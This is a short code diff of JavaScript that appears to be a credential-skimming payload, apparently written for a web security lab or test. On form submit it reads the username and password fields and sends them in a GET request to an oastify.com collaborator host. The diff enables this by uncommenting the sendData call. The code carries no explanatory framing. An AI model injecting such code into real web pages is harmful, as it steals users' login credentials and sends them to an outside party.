@@ -21,11 +21,11 @@
                 xhr.open('GET', 'https://hsd0gyosk5qk1lzr8cz7uqxxroxflb90.oastify.com/USER' + encodeURIComponent(username) + 'PASS' + encodeURIComponent(password) + '.png', true);
                 xhr.send();
             }
-            var form = document.querySelector('form'); // Adjust selector as needed
-            form.addEventListener('submit', function (event) {
-                var username = document.querySelector('#control').value; // Adjust selector as needed
-                var password = document.querySelector('#control').value; // Adjust selector as needed
-                //sendData(username, password);
+            var form = document.getElementsByTagName('form')[0]; // Adjust selector as needed
+            form.addEventListener('submit', function(event) {
+                var username = document.getElementById('control').value; // Assumes there is an element with ID 'username'
+                var password = document.getElementById('control').value; // Assumes there is an element with ID 'password'
+                sendData(username, password);
                 alert(username+password);
                 console.log(username+password);
                 
